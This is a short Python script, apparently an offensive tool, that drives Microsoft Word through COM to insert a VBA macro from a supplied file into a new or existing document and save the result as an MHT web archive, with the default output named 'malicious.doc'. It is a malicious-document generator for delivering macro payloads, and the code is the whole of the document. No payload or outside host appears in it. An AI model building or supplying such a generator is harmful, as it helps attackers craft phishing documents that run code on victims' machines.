#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Isis (@0x1sis)

import sys
from pathlib import Path
from termcolor import colored

if sys.platform == "win32":
    import win32com.client  # Required for Word automation


class MHTGenerator:
    def __init__(self, vba_file, doc_file=None, output_file="malicious.doc"):
        self.vba_file = Path(vba_file).resolve()
        self.doc_file = Path(doc_file).resolve() if doc_file else None
        self.output_file = Path(output_file).resolve()
        self.injected_mht = self.output_file.with_suffix(".mht")

    @staticmethod
    def verify_file(filepath, allowed_ext=None):
        filepath = Path(filepath)
        if not filepath.exists():
            raise SystemExit(colored(f"[!] Error: File '{filepath}' does not exist.", "light_red"))

        if allowed_ext and filepath.suffix.lower() not in allowed_ext:
            raise SystemExit(colored(f"[!] Error: Invalid file format for '{filepath}'. Allowed: {allowed_ext}", "light_red"))

    def create_mht_file(self):
        word = None
        doc = None

        try:
            word = win32com.client.Dispatch("Word.Application")
            word.Visible = False

            doc = word.Documents.Open(str(self.doc_file)) if self.doc_file else word.Documents.Add()

            with open(self.vba_file, "r", encoding="latin-1") as f:
                vba_code = f.read()

            vb_component = doc.VBProject.VBComponents.Add(1)
            vb_component.CodeModule.AddFromString(vba_code)

            # Save document as MHT (Web Archive Format)
            doc.SaveAs(str(self.injected_mht), FileFormat=9)

        except Exception as e:
            print(colored(f"[!] Error while creating the MHT file: {e}", "light_red"))

        finally:
            if doc:
                doc.Close(False)
            if word:
                word.Quit()

    def run(self):
        self.verify_file(self.vba_file, allowed_ext=[".vba"])

        if self.doc_file:
            self.verify_file(self.doc_file, allowed_ext=[".doc", ".docm", ".docx"])

        # Generate MHT file with VBA macro
        self.create_mht_file()
